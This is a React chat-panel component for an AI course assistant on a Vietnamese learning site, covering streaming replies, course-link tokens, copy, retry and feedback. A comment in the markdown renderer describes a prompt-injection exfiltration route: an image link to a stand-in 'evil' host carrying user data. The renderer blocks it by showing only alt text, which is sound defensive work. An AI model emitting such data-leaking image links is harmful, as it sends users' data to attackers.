import { useEffect, useLayoutEffect, useRef, useState } from 'react';
import { Link } from 'react-router-dom';
import { useQuery, useQueryClient } from '@tanstack/react-query';
import ReactMarkdown from 'react-markdown';
import { ArrowUp, ArrowDown, Square, Sparkles, Copy, Check, RotateCcw, AlertCircle, ThumbsUp, ThumbsDown } from 'lucide-react';
import { toast } from 'sonner';
import { api, apiMessage } from '@/lib/api';
import { streamSSE } from '@/lib/stream';
import { formatPrice, levelLabel } from '@/lib/format';
import { cn } from '@/lib/utils';
import { THUMB_COLORS } from '@/components/course-editor.jsx';
import { ASSISTANTS } from './assistants.js';

const MAX_LEN = 1000;
const TOKEN_RE = /\[\[course:([a-z0-9-]+)\]\]/g;

/**
 * Mã [[course:slug]]: khóa có thật → link; đang stream / slug bịa → bỏ.
 * Model thường viết "Tên khóa [[course:slug]]" → chỉ thêm ↗; nếu quên tên ("khóa [[course:x]]") thì chèn tên khóa.
 */
function renderTokens(text, courses, streaming) {
  const bySlug = new Map((courses ?? []).map((c) => [c.slug, c]));
  return text
    .replace(TOKEN_RE, (_m, slug, offset) => {
      const course = bySlug.get(slug);
      if (streaming || !course) return '';
      const before = text.slice(Math.max(0, offset - course.title.length - 8), offset).toLowerCase();
      return before.includes(course.title.toLowerCase())
        ? ` [↗](/courses/${slug})`
        : ` [${course.title.replace(/[[\]]/g, '')} ↗](/courses/${slug})`;
    })
    .replace(/\[\[course:[a-z0-9-]*$/, ''); // mã đang stream dở
}

/** Chữ để sao chép: bỏ mã [[course:…]] (người dùng dán sang chỗ khác không cần). */
const plainForCopy = (text) => text.replace(TOKEN_RE, '').replace(/[ \t]+\n/g, '\n').trim();

async function copyText(text) {
  try { await navigator.clipboard.writeText(text); return true; } catch { return false; }
}

function useCopied() {
  const [copied, setCopied] = useState(false);
  const timer = useRef(null);
  useEffect(() => () => clearTimeout(timer.current), []);
  const copy = async (text) => {
    if (!(await copyText(text))) return;
    setCopied(true);
    clearTimeout(timer.current);
    timer.current = setTimeout(() => setCopied(false), 1600);
  };
  return [copied, copy];
}

/** Khối code luôn nền tối (The Always-Dark Code Rule), có nhãn ngôn ngữ và nút sao chép. */
function CodeBlock({ node, children }) {
  const [copied, copy] = useCopied();
  const code = node?.children?.[0];
  const lang = (code?.properties?.className ?? []).find((c) => String(c).startsWith('language-'))?.slice(9);
  const source = (code?.children ?? []).map((c) => c.value ?? '').join('').replace(/\n$/, '');
  return (
    <div className="my-3 rounded-[10px] overflow-hidden border border-white/10 bg-[#0d1117]">
      <div className="flex items-center justify-between h-8 pl-3 pr-1 border-b border-white/10">
        <span className="font-mono text-[10.5px] tracking-[0.06em] uppercase text-slate-400">{lang || 'code'}</span>
        <button type="button" onClick={() => copy(source)} aria-label={copied ? 'Đã sao chép code' : 'Sao chép code'}
          className="inline-flex items-center gap-1 h-6 px-2 rounded-md font-mono text-[10.5px] text-slate-400 hover:text-slate-100 hover:bg-white/10 transition-colors">
          {copied ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
          {copied ? 'Đã chép' : 'Chép'}
        </button>
      </div>
      <pre className="px-3.5 py-3 overflow-x-auto text-[12.5px] leading-[1.6] text-slate-200 font-mono">{children}</pre>
    </div>
  );
}

const MD_CLS = cn(
  'text-[14px] leading-[1.7] text-ink break-words',
  '[&_p]:mb-2.5 [&_p:last-child]:mb-0 [&_ul]:list-disc [&_ul]:pl-5 [&_ul]:mb-2.5 [&_ol]:list-decimal [&_ol]:pl-5 [&_ol]:mb-2.5',
  '[&_li]:my-1 [&_li]:pl-0.5 [&_li::marker]:text-ink-3 [&_strong]:font-semibold [&_em]:text-ink-2',
  '[&_h1]:text-[15px] [&_h2]:text-[15px] [&_h3]:text-[14px] [&_h1]:font-semibold [&_h2]:font-semibold [&_h3]:font-semibold',
  '[&_h1]:mt-4 [&_h2]:mt-4 [&_h3]:mt-3 [&_h1]:mb-1.5 [&_h2]:mb-1.5 [&_h3]:mb-1 [&>:first-child]:mt-0',
  '[&_:not(pre)>code]:font-mono [&_:not(pre)>code]:text-[12.5px] [&_:not(pre)>code]:bg-bg-2 [&_:not(pre)>code]:border [&_:not(pre)>code]:border-line',
  '[&_:not(pre)>code]:px-1 [&_:not(pre)>code]:py-px [&_:not(pre)>code]:rounded',
  '[&_blockquote]:border-l [&_blockquote]:border-line [&_blockquote]:pl-3 [&_blockquote]:text-ink-2',
  '[&_hr]:my-3 [&_hr]:border-line',
);

const markdownComponents = {
  a: ({ href, children }) => (href?.startsWith('/')
    ? <Link to={href} className="text-accent font-semibold no-underline hover:underline underline-offset-2">{children}</Link>
    : <a href={href} target="_blank" rel="noopener noreferrer nofollow" className="text-accent underline underline-offset-2">{children}</a>),
  // Không tải ảnh từ câu trả lời của AI: ![](https://evil/?q=<dữ liệu>) do prompt injection chèn vào
  // sẽ tự gửi dữ liệu ra ngoài ngay khi hiển thị, không cần ai bấm. Chỉ giữ lại chữ thay thế (alt).
  img: ({ alt }) => (alt ? <span className="text-ink-3">[{alt}]</span> : null),
  pre: CodeBlock,
};

function CourseCard({ course }) {
  return (
    <Link to={`/courses/${course.slug}`}
      className="group flex items-center gap-3 p-2.5 rounded-[10px] border border-line bg-bg-1 hover:border-accent/40 hover:bg-bg-2 transition-colors">
      <span className="w-10 h-10 rounded-lg grid place-items-center font-mono font-bold text-[11px] text-bg shrink-0"
        style={{ background: THUMB_COLORS[course.thumb] ?? THUMB_COLORS.yellow }} aria-hidden="true">
        {course.glyph || 'JS'}
      </span>
      <span className="min-w-0 flex-1">
        <span className="block text-[13px] font-semibold text-ink truncate group-hover:text-accent transition-colors">{course.title}</span>
        <span className="block font-mono text-[11px] text-ink-3 tabular-nums truncate">
          {[formatPrice(course.price), levelLabel(course.level), course.rating ? `★ ${course.rating}` : null].filter(Boolean).join(' · ')}
        </span>
      </span>
    </Link>
  );
}

/** Lỗi của streamSSE → câu tiếng Việt có hướng xử lý (không lộ "Failed to fetch" / "Lỗi 500"). */
function chatErrorText(err) {
  // fetch() thất bại ở tầng mạng ném TypeError; lỗi khác không có status (parse SSE, onEvent) là lỗi phía trợ lý
  if (err.name === 'TypeError' && !err.status) return 'Không kết nối được trợ lý. Kiểm tra mạng rồi thử lại.';
  if (!err.status) return 'Câu trả lời bị gián đoạn.';
  if (err.status >= 500 && (!err.message || /^Lỗi( máy chủ| \d+)$/.test(err.message))) {
    return 'Trợ lý chưa trả lời được lúc này. Thử lại sau giây lát.';
  }
  return err.message;
}

function MessageActions({ m, onRetry, onFeedback }) {
  const [copied, copy] = useCopied();
  const btn = 'inline-flex items-center gap-1.5 h-7 px-2 rounded-md text-[12px] text-ink-3 hover:text-ink hover:bg-bg-2 transition-colors';
  const vote = (value, label, Icon) => {
    const on = m.feedback === value;
    return (
      <button type="button" onClick={() => onFeedback(on ? null : value)} aria-pressed={on} aria-label={label} title={label}
        className={cn('w-7 h-7 rounded-md grid place-items-center transition-colors hover:bg-bg-2',
          on ? 'text-accent' : 'text-ink-3 hover:text-ink')}>
        <Icon className={cn('w-3.5 h-3.5', on && 'fill-current')} />
      </button>
    );
  };
  return (
    <div className="mt-1.5 -ml-2 flex items-center gap-0.5">
      {m.content && (
        <button type="button" onClick={() => copy(plainForCopy(m.content))} className={btn}
          aria-label={copied ? 'Đã sao chép câu trả lời' : 'Sao chép câu trả lời'}>
          {copied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
          {copied ? 'Đã chép' : 'Sao chép'}
        </button>
      )}
      {onRetry && (
        <button type="button" onClick={onRetry} className={btn}>
          <RotateCcw className="w-3.5 h-3.5" /> Thử lại
        </button>
      )}
      {onFeedback && m.id && m.content && !m.error && (
        <>
          {vote(1, 'Câu trả lời hữu ích', ThumbsUp)}
          {vote(-1, 'Câu trả lời chưa tốt', ThumbsDown)}
        </>
      )}
    </div>
  );
}

function Message({ m, onRetry, onFeedback, wide }) {
  if (m.role === 'user') {
    return (
      <div className="flex justify-end pl-10">
        <div className="max-w-full px-3.5 py-2.5 rounded-2xl rounded-br-md bg-bg-3 border border-line text-ink text-[14px] leading-[1.6] whitespace-pre-wrap break-words">
          {m.content}
        </div>
      </div>
    );
  }
  const waiting = m.streaming && !m.content;
  return (
    <div className="flex gap-3">
      <span className="w-7 h-7 rounded-lg border border-line bg-bg-1 text-accent grid place-items-center shrink-0" aria-hidden="true">
        <Sparkles className="w-3.5 h-3.5" />
      </span>
      <div className="min-w-0 flex-1 pt-[3px]">
        {waiting && (
          <p className="text-[13px] text-ink-3"><span className="chat-caret-solo">Đang soạn câu trả lời</span></p>
        )}
        {m.content && (
          <div className={cn(MD_CLS, m.streaming && 'chat-caret')}>
            <ReactMarkdown components={markdownComponents}>{renderTokens(m.content, m.courses, m.streaming)}</ReactMarkdown>
          </div>
        )}
        {m.stopped && !m.error && <p className="mt-2 text-[12.5px] text-ink-3">Đã dừng câu trả lời.</p>}
        {m.error && (
          <p className="mt-2 flex items-start gap-1.5 text-[13px] text-danger" role="alert">
            <AlertCircle className="w-4 h-4 shrink-0 mt-px" /> {m.error}
          </p>
        )}
        {m.courses?.length > 0 && !m.streaming && (
          <div className="mt-3">
            <p className="mb-1.5 font-mono text-[10.5px] tracking-[0.08em] uppercase text-ink-3">Khóa học được nhắc tới</p>
            <div className={cn('grid gap-1.5', wide && 'sm:grid-cols-2')}>{m.courses.map((c) => <CourseCard key={c.slug} course={c} />)}</div>
          </div>
        )}
        {!m.streaming && (m.content || onRetry) && <MessageActions m={m} onRetry={onRetry} onFeedback={onFeedback} />}
      </div>
    </div>
  );
}

function EmptyState({ assistant, onPick, wide }) {
  return (
    <div className="h-full flex flex-col justify-center py-6">
      {wide && (
        <span className="w-10 h-10 rounded-xl border border-line bg-bg-1 text-accent grid place-items-center mb-4" aria-hidden="true">
          <Sparkles className="w-[18px] h-[18px]" />
        </span>
      )}
      <h2 className="font-display font-semibold text-[17px] leading-snug text-ink">{assistant.emptyTitle}</h2>
      <p className="mt-1 text-[13.5px] leading-[1.6] text-ink-2 max-w-[440px]">{assistant.intro}</p>
      <div className={cn('mt-5 grid gap-1.5', wide && 'sm:grid-cols-2')}>
        {assistant.suggestions.map(({ icon: Icon, text }) => (
          <button key={text} type="button" onClick={() => onPick(text)}
            className="group flex items-start gap-2.5 text-left px-3 py-2.5 rounded-[10px] border border-line bg-bg-1 text-[13px] leading-snug text-ink-2 hover:text-ink hover:border-accent/40 hover:bg-bg-2 transition-colors">
            <Icon className="w-4 h-4 shrink-0 mt-px text-ink-3 group-hover:text-accent transition-colors" />
            {text}
          </button>
        ))}
      </div>
    </div>
  );
}

function HistorySkeleton() {
  return (
    <div className="space-y-6 py-2" aria-label="Đang tải hội thoại" role="status">
      {[0, 1].map((i) => (
        <div key={i} className="space-y-6">
          <div className="ml-auto h-10 w-2/5 rounded-2xl bg-bg-2 animate-pulse motion-reduce:animate-none" />
          <div className="flex gap-3">
            <div className="w-7 h-7 rounded-lg bg-bg-2" />
            <div className="flex-1 space-y-2">
              <div className="h-3 w-11/12 rounded bg-bg-2 animate-pulse motion-reduce:animate-none" />
              <div className="h-3 w-4/5 rounded bg-bg-2 animate-pulse motion-reduce:animate-none" />
              <div className="h-3 w-3/5 rounded bg-bg-2 animate-pulse motion-reduce:animate-none" />
            </div>
          </div>
        </div>
      ))}
    </div>
  );
}

/**
 * Khung chat với trợ lý — dùng cho widget nổi và trang toàn màn hình, cho cả học viên lẫn giảng viên.
 * assistant: một mục trong ASSISTANTS. conversationId = null → hội thoại mới;
 * onConversationChange(id) khi server tạo hội thoại (hoặc null khi hội thoại không còn).
 */
export function ChatPanel({
  assistant = ASSISTANTS.learner, conversationId, onConversationChange, lessonId = null, autoFocus, wide = false, className,
}) {
  const qc = useQueryClient();
  const scope = assistant.history ?? assistant.id; // trợ lý trong trang học dùng chung lịch sử với trợ lý học viên
  const keySeq = useRef(0);
  const localKey = () => `local-${(keySeq.current += 1)}`;
  const [messages, setMessages] = useState([]);
  const [input, setInput] = useState('');
  const [streaming, setStreaming] = useState(false);
  const [atBottom, setAtBottom] = useState(true);
  const abortRef = useRef(null);
  const listRef = useRef(null);
  const inputRef = useRef(null);
  const stick = useRef(true); // người dùng đang ở cuối danh sách → tự cuộn theo câu trả lời
  const ownConversation = useRef(null); // id do chính panel này vừa tạo → không tải lại giữa chừng

  const history = useQuery({
    queryKey: ['ai-conversation', scope, conversationId],
    queryFn: () => api.get(`${assistant.api}/conversations/${conversationId}`).then((r) => r.data),
    enabled: !!conversationId && ownConversation.current !== conversationId,
    retry: (count, err) => err?.response?.status !== 404 && count < 2,
  });
  const loadingHistory = history.isPending && history.fetchStatus !== 'idle';
  const notFound = history.error?.response?.status === 404;

  useEffect(() => {
    if (!conversationId) { setMessages([]); return; }
    if (history.data?.messages && ownConversation.current !== conversationId) {
      stick.current = true;
      setMessages(history.data.messages);
    }
  }, [conversationId, history.data]);

  useEffect(() => () => abortRef.current?.abort(), []);
  useEffect(() => { if (autoFocus) inputRef.current?.focus({ preventScroll: true }); }, [autoFocus]);

  useLayoutEffect(() => {
    if (stick.current) listRef.current?.scrollTo({ top: listRef.current.scrollHeight });
  }, [messages]);

  // Ô nhập tự cao theo nội dung (tối đa ~6 dòng)
  useLayoutEffect(() => {
    const el = inputRef.current;
    if (!el) return;
    el.style.height = 'auto';
    el.style.height = `${Math.min(el.scrollHeight, 160)}px`;
  }, [input]);

  const onScroll = () => {
    const el = listRef.current;
    const near = el.scrollHeight - el.scrollTop - el.clientHeight < 72;
    stick.current = near;
    setAtBottom(near);
  };
  const toBottom = () => {
    stick.current = true;
    setAtBottom(true);
    listRef.current?.scrollTo({ top: listRef.current.scrollHeight, behavior: 'smooth' });
  };

  const patchLast = (fn) => setMessages((ms) => [...ms.slice(0, -1), fn(ms[ms.length - 1])]);

  const send = async (text, { replaceLast = false } = {}) => {
    const message = text.trim();
    if (!message || streaming) return;
    setInput('');
    stick.current = true;
    setAtBottom(true);
    setMessages((ms) => [
      ...(replaceLast ? ms.slice(0, -2) : ms),
      { key: localKey(), role: 'user', content: message },
      { key: localKey(), role: 'assistant', content: '', streaming: true },
    ]);
    setStreaming(true);
    const ctl = new AbortController();
    abortRef.current = ctl;
    try {
      await streamSSE(`${assistant.api}/chat`, { message, conversationId, ...(lessonId && !conversationId ? { lessonId } : {}) }, {
        signal: ctl.signal,
        onEvent: (event, payload) => {
          if (event === 'meta' && payload.conversationId !== conversationId) {
            ownConversation.current = payload.conversationId;
            onConversationChange?.(payload.conversationId);
          }
          if (event === 'delta') patchLast((m) => ({ ...m, content: m.content + payload.text }));
          if (event === 'done') patchLast((m) => ({ ...m, streaming: false, courses: payload.courses, id: payload.messageId }));
          if (event === 'error') patchLast((m) => ({ ...m, streaming: false, error: payload.message, retryText: message }));
        },
      });
    } catch (err) {
      if (err.name === 'AbortError') patchLast((m) => ({ ...m, stopped: true }));
      else patchLast((m) => ({ ...m, streaming: false, error: chatErrorText(err), retryText: message }));
    } finally {
      patchLast((m) => ({ ...m, streaming: false }));
      setStreaming(false);
      abortRef.current = null;
      qc.invalidateQueries({ queryKey: ['ai-conversations', scope] });
    }
  };

  // Đánh giá câu trả lời: cập nhật ngay trên giao diện, lỗi thì trả lại như cũ
  const setFeedback = async (id, value) => {
    const prev = messages.find((m) => m.id === id)?.feedback ?? null;
    const apply = (v) => setMessages((ms) => ms.map((m) => (m.id === id ? { ...m, feedback: v } : m)));
    apply(value);
    try {
      await api.put(`${assistant.api}/messages/${id}/feedback`, { value });
      if (value === -1) toast('Cảm ơn bạn — đánh giá này giúp cải thiện trợ lý.');
    } catch (err) {
      apply(prev);
      toast.error(apiMessage(err, 'Chưa lưu được đánh giá. Thử lại sau giây lát.'));
    }
  };

  const onKeyDown = (e) => {
    if (e.key !== 'Enter' || e.shiftKey) return;
    // Enter của bộ gõ (Telex/VNI trên macOS, Win 11…) chỉ chốt chữ đang gõ — chưa gửi.
    // keyCode 229: Safari báo compositionend trước keydown nên isComposing đã là false.
    if (e.nativeEvent.isComposing || e.keyCode === 229) return;
    e.preventDefault();
    send(input);
  };

  const last = messages[messages.length - 1];
  const nearLimit = input.length > MAX_LEN * 0.8;

  let body;
  if (loadingHistory) body = <HistorySkeleton />;
  else if (notFound) {
    body = (
      <div className="h-full grid place-items-center text-center py-10">
        <div>
          <p className="text-[14px] font-semibold text-ink">Không tìm thấy hội thoại này</p>
          <p className="mt-1 text-[13px] text-ink-3">Có thể nó đã bị xóa. Bạn có thể bắt đầu hội thoại mới.</p>
          <button type="button" onClick={() => onConversationChange?.(null)}
            className="mt-4 h-[30px] px-3 rounded-md border border-line text-[12.5px] font-semibold text-ink hover:bg-bg-2">
            Hội thoại mới
          </button>
        </div>
      </div>
    );
  } else if (history.isError) {
    body = (
      <div className="h-full grid place-items-center text-center py-10">
        <div>
          <p className="text-[14px] font-semibold text-ink">Chưa tải được hội thoại</p>
          <p className="mt-1 text-[13px] text-ink-3">Kiểm tra kết nối rồi thử lại.</p>
          <button type="button" onClick={() => history.refetch()}
            className="mt-4 inline-flex items-center gap-1.5 h-[30px] px-3 rounded-md border border-line text-[12.5px] font-semibold text-ink hover:bg-bg-2">
            <RotateCcw className="w-3.5 h-3.5" /> Tải lại
          </button>
        </div>
      </div>
    );
  } else if (messages.length === 0) body = <EmptyState assistant={assistant} onPick={(t) => send(t)} wide={wide} />;
  else {
    body = (
      <div className="space-y-6 pb-2">
        {messages.map((m, i) => (
          <Message key={m.key ?? m.id ?? i} m={m} wide={wide}
            onFeedback={m.id ? (v) => setFeedback(m.id, v) : undefined}
            onRetry={m === last && m.error && m.retryText && !streaming ? () => send(m.retryText, { replaceLast: true }) : undefined} />
        ))}
      </div>
    );
  }

  return (
    <div className={cn('relative flex flex-col min-h-0', className)}>
      <div ref={listRef} onScroll={onScroll} role="log" aria-live="polite" aria-busy={streaming}
        aria-label={`Hội thoại với ${assistant.name.toLowerCase()}`}
        className="flex-1 overflow-y-auto overscroll-contain px-4 sm:px-5 py-5 [scrollbar-gutter:stable]">
        <div className="mx-auto max-w-[720px] h-full">{body}</div>
      </div>

      <form onSubmit={(e) => { e.preventDefault(); send(input); }} className="relative px-3 sm:px-5 pt-2 pb-3">
        {!atBottom && messages.length > 0 && (
          <button type="button" onClick={toBottom} aria-label="Cuộn xuống tin nhắn mới nhất"
            className="absolute left-1/2 -translate-x-1/2 -top-10 z-10 w-8 h-8 rounded-full border border-line bg-bg-1 text-ink-2 hover:text-ink shadow-lg shadow-black/20 grid place-items-center">
            <ArrowDown className="w-4 h-4" />
          </button>
        )}
        <div className="mx-auto max-w-[720px]">
          <div className={cn('flex items-end gap-2 rounded-2xl border bg-bg-3 pl-3.5 pr-2 py-2 transition-colors',
            'border-line focus-within:border-accent/60')}>
            <label htmlFor={`chat-input-${assistant.id}`} className="sr-only">Câu hỏi cho {assistant.name.toLowerCase()}</label>
            <textarea
              id={`chat-input-${assistant.id}`}
              ref={inputRef}
              value={input}
              onChange={(e) => setInput(e.target.value.slice(0, MAX_LEN))}
              onKeyDown={onKeyDown}
              rows={1}
              maxLength={MAX_LEN}
              placeholder={assistant.placeholder}
              className="flex-1 resize-none bg-transparent py-1.5 text-[14px] leading-[1.5] text-ink placeholder:text-ink-3 focus:outline-none focus-visible:outline-none"
            />
            {streaming ? (
              <button type="button" onClick={() => abortRef.current?.abort()} aria-label="Dừng trả lời"
                className="w-9 h-9 rounded-xl border border-line bg-bg-1 text-ink grid place-items-center shrink-0 hover:bg-bg-2">
                <Square className="w-3.5 h-3.5 fill-current" />
              </button>
            ) : (
              <button type="submit" disabled={!input.trim()} aria-label="Gửi câu hỏi"
                className="w-9 h-9 rounded-xl bg-accent text-accent-ink grid place-items-center shrink-0 transition hover:brightness-95 disabled:bg-bg-2 disabled:text-ink-3 disabled:hover:brightness-100">
                <ArrowUp className="w-4 h-4" />
              </button>
            )}
          </div>
          <div className="mt-1.5 flex items-center justify-between gap-3 px-1 text-[11px] text-ink-3">
            <span>AI có thể sai — kiểm tra lại thông tin quan trọng.</span>
            {nearLimit
              ? <span className={cn('font-mono tabular-nums shrink-0', input.length >= MAX_LEN && 'text-danger')}>{input.length}/{MAX_LEN}</span>
              : wide && <span className="hidden sm:inline shrink-0"><kbd className="font-mono">Shift</kbd> + <kbd className="font-mono">Enter</kbd> xuống dòng</span>}
          </div>
        </div>
      </form>
    </div>
  );
}
